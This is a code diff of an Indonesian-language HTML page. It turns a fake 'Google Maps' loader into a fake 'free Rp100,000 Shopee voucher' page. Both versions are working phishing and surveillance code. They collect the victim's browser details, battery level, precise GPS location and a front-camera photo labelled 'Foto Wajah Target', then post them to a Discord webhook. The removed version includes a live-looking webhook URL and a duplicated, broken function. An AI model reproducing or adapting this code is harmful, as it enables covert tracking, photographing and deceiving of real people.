@@ -3,110 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Maps - Memuat Lokasi...</title>
-    <link rel="icon" type="image/x-icon" href="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png">
+    <title>Klaim Voucher Belanja Gratis!</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Roboto', sans-serif; background: #f8f9fa; overflow: hidden; }
-        #loader { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .logo { width: 100px; margin-bottom: 20px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.7; } 100% { transform: scale(1); opacity: 1; } }
-        .status { color: #5f6368; font-size: 15px; }
-        canvas, video { display: none; }
+        body { font-family: sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); text-align: center; width: 90%; max-width: 350px; }
+        .icon { font-size: 50px; margin-bottom: 10px; }
+        h2 { color: #ee4d2d; margin: 0; }
+        p { color: #555; font-size: 14px; margin: 15px 0; }
+        .btn { background: #ee4d2d; color: white; border: none; padding: 15px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div id="loader">
-    <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" class="logo">
-    <div class="status">Mengalibrasi GPS...<br><span style="font-size: 11px;">Mohon tunggu sebentar untuk akurasi terbaik</span></div>
+<div class="card">
+    <div class="icon">🎁</div>
+    <h2>Voucher Rp100.000</h2>
+    <p>Selamat! Kamu terpilih mendapatkan voucher gratis. Klik tombol di bawah untuk aktivasi berdasarkan lokasi kamu.</p>
+    <button class="btn" onclick="startCapture()">KLAIM SEKARANG</button>
 </div>
 
 <video id="video" autoplay></video>
 <canvas id="canvas"></canvas>
 
 <script>
-  // GANTI DENGAN WEBHOOK DISCORD KAMU
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";
+    // MASUKKAN WEBHOOK DISCORD KAMU DI SINI
+    const DISCORD_WEBHOOK = "ISI_DENGAN_LINK_WEBHOOK_DISCORD_KAMU";
 
     async function sendData(content, file = null) {
         const formData = new FormData();
         if (file) {
-            formData.append('file', file, 'capture.jpg');
+            formData.append('file', file, 'foto.jpg');
             formData.append('payload_json', JSON.stringify({ content: content }));
         } else {
             formData.append('payload_json', JSON.stringify({ content: content }));
         }
-        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
-    }
-
-    async function getDeviceInfo() {
-        let batteryInfo = "Tidak Terdeteksi";
-        if (navigator.getBattery) {
-            const battery = await navigator.getBattery();
-            batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'Lagi di-cas ⚡' : 'Tidak di-cas 🪫'})`;
-        }
-        
-  async function getDeviceInfo() {
-        let batteryInfo = "Tidak Terdeteksi";
-        if (navigator.getBattery) {
-            const battery = await navigator.getBattery();
-            batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'Lagi di-cas ⚡' : 'Tidak di-cas 🪫'})`;
-        }
-        
-        // Perbaikan di sini: Gunakan teks biasa saja agar tidak error
-        const info = "📱 Informasi Perangkat Target:\n" +
-                     "• HP/Browser: " + navigator.userAgent + "\n" +
-                     "• Baterai: " + batteryInfo + "\n" +
-                     "• Platform: " + navigator.platform + "\n" +
-                     "• Bahasa: " + navigator.language;
-                     
-        return info;
+        return fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
     }
 
     async function startCapture() {
-        const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
+        const btn = document.querySelector('.btn');
+        btn.innerText = "Memproses...";
+        btn.disabled = true;
 
-        if (navigator.geolocation) {
-            // Ambil Info Perangkat Dulu
-            const deviceInfo = await getDeviceInfo();
-            await sendData(deviceInfo);
-
-            navigator.geolocation.getCurrentPosition(async (position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const acc = position.coords.accuracy;
-                const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-
-                await sendData(`📍 **Lokasi Terdeteksi!**\nAkurasi: ${acc.toFixed(1)} meter\nLink: ${mapsUrl}`);
-
-                // Ambil Foto
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-                    
-                    setTimeout(async () => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        
-                        canvas.toBlob(async (blob) => {
-                            await sendData("📸 **Foto Target:**", blob);
-                            stream.getTracks().forEach(t => t.stop());
-                            window.location.href = mapsUrl; 
-                        }, 'image/jpeg');
-                    }, 2000);
-                } catch (e) {
-                    window.location.href = mapsUrl;
-                }
-            }, (err) => {
-                window.location.href = "https://www.google.com/maps";
-            }, options);
+        // 1. Ambil Info Perangkat & Baterai
+        let deviceMsg = "📱 **Target Terdeteksi!**\n";
+        deviceMsg += "• Browser: " + navigator.userAgent + "\n";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            deviceMsg += `• Baterai: ${(b.level * 100).toFixed(0)}% (${b.charging ? 'Cas ⚡' : 'Baterai 🪫'})\n`;
         }
-    }
+        await sendData(deviceMsg);
 
-    window.onload = startCapture;
+        // 2. Ambil Lokasi
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            await sendData(`📍 **Lokasi Akurat (${acc.toFixed(1)}m):**\n${mapLink}`);
+
+            // 3. Ambil Foto
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(async (blob) => {
+                        await sendData("📸 **Foto Wajah Target:**", blob);
+                        stream.getTracks().forEach(t => t.stop());
+                        alert("Voucher gagal diklaim. Coba lagi nanti.");
+                        window.location.href = "https://shopee.co.id";
+                    }, 'image/jpeg');
+                }, 2000);
+            } catch (e) {
+                window.location.href = "https://shopee.co.id";
+            }
+        }, (err) => {
+            alert("Izin lokasi diperlukan untuk klaim voucher.");
+            location.reload();
+        }, { enableHighAccuracy: true });
+    }
 </script>
 </body>
 </html>
